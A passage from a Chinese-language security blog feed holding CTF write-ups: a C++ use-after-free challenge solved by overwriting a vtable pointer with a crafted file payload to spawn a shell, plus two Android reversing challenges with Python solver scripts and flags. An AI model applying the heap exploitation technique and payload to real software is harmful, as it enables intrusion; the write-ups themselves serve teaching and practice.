class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先checksec<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-062433.png" alt=""><br>因为这是一道开源pwn，给了我们源码，而且代码也不复杂，没有什么逆向的必要，为了方便理解，我就直接从源码进行分析。</p><h3 id="类的继承和虚表"><a href="#类的继承和虚表" class="headerlink" title="类的继承和虚表"></a>类的继承和虚表</h3><p>可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。<br>Man和Woman都继承了Human类的vtable，可以通过调试，跟随子类的构造函数，找到vtable。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line"><span class="keyword">char</span>* data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line">        <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                 <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        m-&gt;introduce();</span><br><span class="line">                        w-&gt;introduce();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                        data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                        read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">delete</span> m;</span><br><span class="line">                        <span class="keyword">delete</span> w;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以看出程序给了我们3个选项</p><ul><li>use 使用指针指向的函数</li><li>after 分配一段地址空间，我们可以用其将已经被free的内存，重新allocate</li><li>free 将指针指向的内存释放</li></ul><p>组合起来就是UAF。</p><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>调试找到虚表中give_shell函数地址。</li><li>free后再allocate，得到一个可控的地址空间.</li><li>为了在use，即m-&gt;introduce()时，将本来执行的introduce函数变成执行give_shell函数，<strong>在allocate的同时，改写虚表指针</strong>。</li><li>劫持控制流，执行give_shell</li></ul><h2 id="漏洞调试和利用"><a href="#漏洞调试和利用" class="headerlink" title="漏洞调试和利用"></a>漏洞调试和利用</h2><h3 id="找到Man的构造函数，从而找到虚函数表"><a href="#找到Man的构造函数，从而找到虚函数表" class="headerlink" title="找到Man的构造函数，从而找到虚函数表"></a>找到Man的构造函数，从而找到虚函数表</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-073918.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-073812.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013807.jpg" alt=""></p><h3 id="覆盖虚表指针"><a href="#覆盖虚表指针" class="headerlink" title="覆盖虚表指针"></a>覆盖虚表指针</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-074305.png" alt=""></p><ul><li><strong>give_shell</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-074336.png" alt=""></li><li><strong>Man::introduce</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-074402.png" alt=""></li><li><strong>call introduce</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-082915.png" alt=""><br>可以看出在执行m-&gt;introduce()的时候，调用call [vptr+8]。<br>为了执行give_shell，我们覆盖虚表指针，让它前移8个字节，这样call [vptr+8]的时候就调用give_shell了。</li><li><strong>allocate</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-075633.png" alt=""><br>从上图可以看出，原本Man对象分配的堆空间是0x18，即24字节，所以我们在再次分配的时候，也要分配24字节，保证自己拿到的是原先被free掉的地址空间。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Human* m = new Man(&quot;Jack&quot;, 25);</span><br><span class="line">Human* w = new Woman(&quot;Jill&quot;, 21);</span><br><span class="line">...</span><br><span class="line">delete m;</span><br><span class="line">delete w;</span><br></pre></td></tr></table></figure><p><strong>因为先free m再free w，所以为了再次拿到m所指向的空间，我们需要分配两次，第一次得到w所指向的空间，第二次才再次得到m所指向的空间</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">len = atoi(argv[1]);</span><br><span class="line">data = new char[len];</span><br><span class="line">read(open(argv[2], O_RDONLY), data, len);</span><br></pre></td></tr></table></figure><p>在此题中，是通过从文件中读出内容覆盖原先的内容的，等同于之前写的<code>strcpy(p-&gt;name,data)</code>，读取的长度是命令行的argv[1]，打开的文件是argv[2]</p><p>0x401570-0x8=0x401568-&gt;\x68\x15\x40\x00\x00\x00\x00\x00</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-082012.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;\x68\x15\x40\x00\x00\x00\x00\x00&apos;&quot; &gt; /tmp/exp.txt</span><br><span class="line">./uaf 24 /tmp/exp.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">yay_f1ag_aft3r_pwning</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>c++类实例在内存中的分配<br><a href="http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html" target="_blank" rel="noopener">http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html</a></li><li>ichunqiu ctf pwn<br><a href="https://www.ichunqiu.com/qad/course/57507" target="_blank" rel="noopener">https://www.ichunqiu.com/qad/course/57507</a></li></ol>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016AliCTF-LoopAndLoop writeup</title>
      <link href="/2018/02/11/loop/"/>
      <url>/2018/02/11/loop/</url>
      <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/LoopAndLoop.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android%E9%80%86%E5%90%91/LoopAndLoop.apk</a></p><h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><ul><li>native层代码分析</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="java层"><a href="#java层" class="headerlink" title="java层"></a>java层</h3><p>首先用jadx-gui反编译，找到主要逻辑<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-11-050917.png" alt=""><br>如果我们能check(input,99)==1835996258，这个input就是flag。<br>那么check函数是什么呢？<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-11-051045.png" alt=""><br>可以看到check函数实际上就是调用chec函数，而chec函数是一个native方法。</p><h3 id="native层"><a href="#native层" class="headerlink" title="native层"></a>native层</h3><p>找到chec后，修复一些类型和重命名变量。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-11-051153.png" alt=""><br>关于怎么修正，可以看我的<a href="http://eternalsakura13.com/2018/02/07/mobicrackNDK/">另一篇wp</a></p><p>主要代码如下：</p><ul><li><p>首先得到java层的check1/2/3三个函数的MethodID，供调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v10 = _JNIEnv::GetMethodID(vEnv, jclass_MainActivity, <span class="string">"check1"</span>, <span class="string">"(II)I"</span>);</span><br><span class="line">v11 = _JNIEnv::GetMethodID(vEnv, jclass_MainActivity, <span class="string">"check2"</span>, <span class="string">"(II)I"</span>);</span><br><span class="line">v12 = _JNIEnv::GetMethodID(vEnv, jclass_MainActivity, <span class="string">"check3"</span>, <span class="string">"(II)I"</span>);</span><br></pre></td></tr></table></figure></li><li><p>通过<code>*(&amp;v10 + 2 * num_99 % 3)</code>来选择调用哪个函数.<br>num%3，得到的结果可能是0,1,2；<br>然后以v10为基准来加，emmm，只能解释到这了，再不懂的话看asm吧。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-11-052101.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-11-052354.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( num_99 - <span class="number">1</span> &lt;= <span class="number">0</span> )</span><br><span class="line">    result = input_user;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    result = _JNIEnv::CallIntMethod(vEnv, v9, *(&amp;v10 + <span class="number">2</span> * num_99 % <span class="number">3</span>), input_user, num_99 - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul><p>然后我们再看一下check1/2/3的具体内容，发现其实就是对input做了一些加减操作，然后再传进去，递归调用chec。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-11-052208.png" alt=""><br>至此我们已经可以写出脚本来算出flag了。<br>其实就是把它做的操作倒过来走一遍，从输出反推到输入即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_check1</span><span class="params">(input, s)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        t -= i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_check2</span><span class="params">(input, s)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">if</span> (s % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">            t -= i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">            t += i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_check3</span><span class="params">(input, s)</span>:</span></span><br><span class="line">    t = input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">        t -= i</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    output = <span class="number">1835996258</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">2</span> * i) % <span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">            output = re_check1(output, i + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> ((<span class="number">2</span> * i) % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">            output = re_check2(output, i + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = re_check3(output, i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> output</span><br></pre></td></tr></table></figure></p><p>计算得到：236492408</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-11-055507.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> android reverse </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>2016AliCTF-Timer writeup</title>
      <link href="/2018/02/11/timer/"/>
      <url>/2018/02/11/timer/</url>
      <content type="html"><![CDATA[<h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><ul><li>smali代码修改</li></ul><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/Timer.apk" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/android逆向/Timer.apk</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>jadx反编译之后，找逻辑。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-171209.png" alt=""><br>总结就是：循环200000次，每循环一次停顿1秒左右，然后循环的时候进行is2()判断，根据判断的结果进行不同的操作。<br>写代码计算<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is2</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> (n &gt; <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">elif</span> (n % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> n % <span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">5</span></span><br><span class="line">        <span class="keyword">while</span> (i * i &lt;= n):</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span> <span class="keyword">or</span> n % (i + <span class="number">2</span>) == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            i += <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    time = <span class="number">200000</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> time &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> is2(time):</span><br><span class="line">            k += <span class="number">100</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k -= <span class="number">1</span></span><br><span class="line">        time -= <span class="number">1</span></span><br><span class="line">    print(k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-171708.png" alt=""><br>计算得到，k=1616384</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>得到要传入的数之后，接下来都是调用一个native方法，将这个数传进去得到结果。<br>可以修改smali文件重打包，也可以直接新建一个android工程，调用这个so文件。</p><h2 id="直接调用so文件"><a href="#直接调用so文件" class="headerlink" title="直接调用so文件"></a>直接调用so文件</h2><p>Android Studio 默认的so文件路径是app/src/main/jniLibs/armeabi，新建一个jniLibs/armeabi文件夹，把so文件放进去。<br>且为了保证native层和java层的方法对应上，我们使用和原来apk一样的包名。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bluelotus.tomorrow.easyandroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"lhm"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI2</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Log.i(<span class="string">"sakura"</span>, stringFromJNI2(<span class="number">1616384</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-10-173716.png" alt=""><br>得到flag，Y0vAr3TimerMa3te7</p><h2 id="修改smali文件重打包"><a href="#修改smali文件重打包" class="headerlink" title="修改smali文件重打包"></a>修改smali文件重打包</h2><p>todo</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> android reverse </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>2015 0CTF simple writeup</title>
      <link href="/2018/02/10/easyre/"/>
      <url>/2018/02/10/easyre/</url>
